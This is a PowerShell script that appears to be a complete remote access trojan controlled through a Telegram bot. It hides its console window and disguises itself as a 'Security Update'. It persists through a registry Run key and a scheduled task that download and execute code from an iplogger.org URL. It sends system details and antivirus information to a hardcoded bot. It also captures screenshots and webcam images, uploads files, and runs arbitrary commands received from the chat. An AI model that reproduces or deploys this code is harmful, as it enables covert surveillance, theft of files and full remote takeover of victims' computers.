Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);'

Hide-Console
#Persist
#KillProc

$BotToken = "1674652212:AAH7SBm8S-i1N7gCJYRlEZeyoJBg6eMwy_4"
$ChatID = '928905258'
$PersistUrl = 'https://iplogger.org/2jaZG6'

function KillProc {
  $host.UI.RawUI.WindowTitle = "System Information"

  (Get-WmiObject Win32_Process -Filter "name = 'powershell'" | where {$_.MainWindowTitle -like '*Security Update*'}).Terminate()
  
  Start-Sleep -Seconds 15
  $host.UI.RawUI.WindowTitle = "Security Update"
}

function Hide-Console {     
$consolePtr = [Console.Window]::GetConsoleWindow()     
#0 hide     
[Console.Window]::ShowWindow($consolePtr, 0) 
} 


function Persist {
  
        reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /f
        reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /t REG_SZ /d "powershell.exe -noni -W Hidden -nop -c iex (New-Object Net.WebClient).DownloadString('https://iplogger.org/2jaZG6')" 
        
        schtasks /delete /tn "Windows\Security\System" /f
        schtasks /create /tn "Windows\Security\System" /sc onidle /i 10 /tr "C:\Windows\System32\cmd.exe  /c powershell.exe -noni -W Hidden -nop -c iex (New-Object Net.WebClient).DownloadString('https://iplogger.org/2jaZG6')" 
        schtasks /run /tn "Windows\Security\System"

        $checkPersist = reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run | Select-String SecurityUpdate
        Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($checkPersist)" -UserAgent Edge -UseBasicParsing
}

function SysInfo {
    $os = (systeminfo | Select-String 'OS Name:').ToString().Split(':')[1].Trim()
    $cpu = (Get-CimInstance -ClassName win32_processor | Select-Object -Property Name -First 1).Name
    $ram = (systeminfo | Select-String 'Total Physical Memory:').ToString().Split(':')[1].Trim()
    $gpu = (Get-CimInstance -ClassName win32_VideoController | Select-Object -Property Name -First 1).Name
    $vram = ([math]::Round(((Get-WmiObject Win32_VideoController | Select-Object -ExpandProperty AdapterRam) / 1GB),0))
    $disks = Get-CimInstance -ClassName win32_logicaldisk -Filter "DriveType = 3"
    $storage = "{0:N2}" -f (($disks | Measure-Object -Property Size -Sum).Sum / 1Gb) -as [decimal]
    $hdd = ($storage).ToString() +"MB"
    $model = (Get-WmiObject win32_baseboard | Select-Object Manufacturer -First 1).Manufacturer
    $product =  (Get-WmiObject win32_baseboard | Select-Object Product -First 1).Product
    $ip = (Invoke-RestMethod http://ipinfo.io/json | Select-Object -Property city, region, postal, ip -First 1).ip
    $anti = AVName

    $sysinfo = "OS: " + $os + "`nCPU: " + $cpu  + "`nGPU: " + $gpu + "`nVRAM: " + $vram +"GB" + "`nRAM: " + $ram + "`nHDD: " + $hdd + "`nMODEL: " + $model + "`nPRODUCT: " + $product + "`nAV: " + $anti + "`n`nClient: " + $username

    $payload = @{
        "chat_id" = $ChatID;
        "text" = $sysinfo;
        "parse_mode" = $markdown_mode;
        "disable_web_page_preview" = $preview_mode;
    }
    Invoke-WebRequest `
        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
        -Method Post `
        -ContentType "application/json;charset=utf-8" `
        -Body (ConvertTo-Json -Compress -InputObject $payload) `
        -UserAgent Edge -UseBasicParsing
}

function CleanAll {
    Remove-Item "C:\Users\Public\screenshot.jpg"
    Remove-Item -Recurse "C:\Users\Public"
    Remove-Item "C:\Users\$env:username\SecurityUpdate.ps1"
    reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v SecurityUpdate /f
    Remove-Item "C:\Users\Public\CommandCam.exe"
}

function InstallCurl {
    $curl = "C:\Users\Public\curl.exe"
    if(![System.IO.File]::Exists($curl)){
        # file with path $path doesn't exist
        $path = "C:\Users\Public"
        $curl_zip = $path + "\curl.zip"
        $curl = $path + "\" + "curl.exe"
        $curl_mod = $path + "\" + "curl_mod.exe"
        if ( (Test-Path $path) -eq $false) {mkdir $path} else {}
        if ( (Test-Path $curl_mod) -eq $false ) {$webclient = "system.net.webclient" ; $webclient = New-Object $webclient ; $webrequest = $webclient.DownloadFile("https://raw.githubusercontent.com/cybervaca/psbotelegram/master/Funciones/curl.zip","$curl_zip")
        [System.Reflection.Assembly]::LoadWithPartialName('System.IO.Compression.FileSystem') | Out-Null
        [System.IO.Compression.ZipFile]::ExtractToDirectory("$curl_zip","$path") | Out-Null
        }
        return $curl
    }
    # else curl exist
    return $curl    
}

function Screenshot {
  [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
    function Screenshot([Drawing.Rectangle]$bounds, $path) {
      
       $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
       $graphics = [Drawing.Graphics]::FromImage($bmp)

       $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

       $bmp.Save($path)

       $graphics.Dispose()
       $bmp.Dispose()
    }
    $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1600, 900)
    Screenshot $bounds "C:\Users\Public\screenshot.jpg"
    Start-Sleep -Seconds 5
    Download "C:\Users\Public\screenshot.jpg"
}

function Send-Message($message) {
    $uri = "https://api.telegram.org/bot" + $BotToken + "/sendMessage"
    $curl = InstallCurl
    $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F text=' + $message  + ' -k '
    Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
}

function Download($FileToDownload) {
  $uri = "https://api.telegram.org/bot" + $BotToken + "/sendDocument"
  $curl = InstallCurl
  $argumenlist = $uri + ' -F chat_id=' + "$ChatID" + ' -F document=@' + $FileToDownload  + ' -F caption=Client:' + $username + ' -k '
  Start-Process $curl -ArgumentList $argumenlist -WindowStyle Hidden
  
  if ([System.IO.File]::Exists("C:\Users\Public\screenshot.jpg")) {
    Start-Sleep -Seconds 15
    Remove-Item "C:\Users\Public\screenshot.jpg"
  }
  if ([System.IO.File]::Exists("C:\Users\Public\image.jpg")) {
    Start-Sleep -Seconds 15
    Remove-Item "C:\Users\Public\image.jpg"
  }
  else {
  }
}

function Webcam {
  $url = "https://github.com/tedburke/CommandCam/raw/master/CommandCam.exe"
  $outpath = "C:\Users\Public\CommandCam.exe"

  $args = "/filename C:\Users\Public\image.jpg"
  Start-Process $outpath -ArgumentList $args -WindowStyle Hidden
  Start-Sleep -Seconds 5
  Download "C:\Users\Public\image.jpg"
}

function AVName {  
  $wmiQuery = "SELECT * FROM AntiVirusProduct"                  
  $antivirus = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters -ErrorVariable myError -ErrorAction 'SilentlyContinue'             

  if($antivirus){
      return $antivirus.displayName            
      }else{
          $alternateAntivirusQuery=WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct GET displayName /Format:List|?{$_.trim() -ne ""}|%{$_ -replace "displayName=",""}
          if ($alternateAntivirusQuery){                    
              return $alternateAntivirusQuery
              }else{
                  write-host "No antivirus software were detected. Hence, namespace querying errors."
                  $rawSearch=((get-wmiobject -class "Win32_Process" -namespace "root\cimv2" | where-object {$_.Name.ToLower() -match "antivirus|endpoint|protection|security|defender|msmpeng"}).Name | Out-String).Trim();
                  if($rawSearch){
                      return $rawSearch
                      }else{
                          return "No antivirus detected."
                          }
                  }
          
          } 
  }

function Test {

}

Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Unrestricted

## CONNECT WITH CHANNEL ##

[Net.ServicePointManager]::SecurityProtocol = 
  [Net.SecurityProtocolType]::Tls12 -bor `
  [Net.SecurityProtocolType]::Tls11 -bor `
  [Net.SecurityProtocolType]::Tls

$username = $env:UserName
$hostname = Invoke-Expression whoami
$pwd = pwd

$info = 'Connect: ' + $username + "`nHostname: " + $hostname + "`nDir: " + $pwd
if($nopreview) { $preview_mode = "True" }
if($markdown) { $markdown_mode = "Markdown" } else {$markdown_mode = ""}

$payload = @{
    "chat_id" = $ChatID;
    "text" = $info;
    "parse_mode" = $markdown_mode;
    "disable_web_page_preview" = $preview_mode;
}

Invoke-WebRequest `
    -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
    -Method Post `
    -ContentType "application/json;charset=utf-8" `
    -Body (ConvertTo-Json -Compress -InputObject $payload) `
    -UserAgent Edge -UseBasicParsing 


## WAIT FOR COMMAND ##

#Time to sleep for each loop before checking if a message with the magic word was received
$LoopSleep = 5

#Get the Last Message Time at the beginning of the script:When the script is ran the first time, it will ignore any last message received!
$BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates" -UserAgent Edge -UseBasicParsing
$BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result
$LastMessageTime_Origin = $BotUpdatesResults[$BotUpdatesResults.Count-1].message.date
 
#Read the responses in a while cycle
$DoNotExit = 1
#$PreviousLoop_LastMessageTime is going to be updated at every cycle (if the last message date changes)
$PreviousLoop_LastMessageTime = $LastMessageTime_Origin
 
$SleepStartTime = [Float] (get-date -UFormat %s) #This will be used to check if the $SleepTime has passed yet before sending a new notification out
While ($DoNotExit)  {
  Sleep -Seconds $LoopSleep
  #Reset variables that might be dirty from the previous cycle
  $LastMessageText = ""
  $CommandToRun = ""
  $CommandToRun_Result = ""
  $CommandToRun_SimplifiedOutput = ""
  $Message = ""
  
  [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
  
  #Get the current Bot Updates and store them in an array format to make it easier
  $BotUpdates = Invoke-WebRequest -Uri "https://api.telegram.org/bot$($BotToken)/getUpdates" -UserAgent Edge -UseBasicParsing 
  $BotUpdatesResults = [array]($BotUpdates | ConvertFrom-Json).result 
  
  #Get just the last message:
  $LastMessage = $BotUpdatesResults[$BotUpdatesResults.Count - 1] 
  #Get the last message time
  $LastMessageTime = $LastMessage.message.date
  
  #If the $LastMessageTime is newer than $PreviousLoop_LastMessageTime, then the user has typed something!
  If ($LastMessageTime -gt $PreviousLoop_LastMessageTime)  {
    #Looks like there's a new message!
    
	#Update $PreviousLoop_LastMessageTime with the time from the latest message
	$PreviousLoop_LastMessageTime = $LastMessageTime
	#Update the LastMessageTime
	$LastMessageTime = $LastMessage.Message.Date
	#Update the $LastMessageText
	$LastMessageText = $LastMessage.Message.Text
	
	Switch -Wildcard ($LastMessageText)  {
	  "/select $username *"  { #Important: run with a space
	    #The user wants to run a command
		$CommandToRun = ($LastMessageText -split ("/select $username "))[1] #This will remove "run "
		#Run the command
		Try {
		  Invoke-Expression $CommandToRun | Out-String | %  {
		    $CommandToRun_Result += "`n $($_)"
		  }
		}
		Catch  {
		  $CommandToRun_Result = $_.Exception.Message
		}		

		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result`n`nClient: $username"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html" -UserAgent Edge -UseBasicParsing
	  }
      "/select all *"  { #Important: run with a space
	    #The all to run a command
		$CommandToRun = ($LastMessageText -split ("/select all "))[1] #This will remove "run "
		#Run the command
		Try {
		  Invoke-Expression $CommandToRun | Out-String | %  {
		    $CommandToRun_Result += "`n $($_)"
		  }
		}
		Catch  {
		  $CommandToRun_Result = $_.Exception.Message
		}		
		$Message = "$($LastMessage.Message.from.first_name), I've ran <b>$($CommandToRun)</b> and this is the output:`n$CommandToRun_Result`n`nClient: $username"
		$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html" -UserAgent Edge -UseBasicParsing
	  }
      "/list"  {
        Invoke-WebRequest `
        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
        -Method Post `
        -ContentType "application/json;charset=utf-8" `
        -Body (ConvertTo-Json -Compress -InputObject $payload) -UserAgent Edge -UseBasicParsing
      }
      "/persist $username"  {
        Persist
      }
      "/persist"  {
        Persist
      }
      "/sysinfo $username"  {
        SysInfo
      }
      "/sysinfo"  {
        SysInfo
      }
      "/cleanAll $username" {
        CleanAll
      }
      "/cleanAll all" {
        CleanAll
      }
      "/down $username *"{
        $FileToDownload = ($LastMessageText -split ("/down $username "))[1]
        Download $FileToDownload
      }
      "/down all *"{
        $FileToDownload = ($LastMessageText -split ("/down all "))[1]
        Download $FileToDownload
      }
      "/screen $username"{
        Screenshot
      }
      "/screen"{
        Screenshot
      }
      "/cam $username"{
        Webcam
      }
      "/cam"{
        Webcam
      }
      "/test"{
        Task
      }
	  default  {
	    #The message sent is unknown
		    #$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
		    #$SendMessage = Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendMessage?chat_id=$($ChatID)&text=$($Message)&parse_mode=html" -UserAgent Edge -UseBasicParsing
        }
	  }
	}
}
